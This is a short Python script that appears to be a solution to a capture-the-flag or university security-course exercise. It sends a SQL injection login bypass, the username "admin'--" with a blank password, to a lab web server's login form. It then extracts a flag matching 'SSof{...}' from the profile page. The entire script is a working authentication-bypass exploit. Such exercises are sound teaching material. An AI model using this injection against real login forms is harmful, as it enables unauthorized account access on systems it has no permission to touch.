import requests
import re

link = "http://mustard.stt.rnl.tecnico.ulisboa.pt:22261"

s = requests.Session()

data = { "username" : "admin'--" , "password" : " "}
s.post(link + "/login", data = data)
print(re.search('SSof{.*}', s.get(link + "/profile").text).group(0))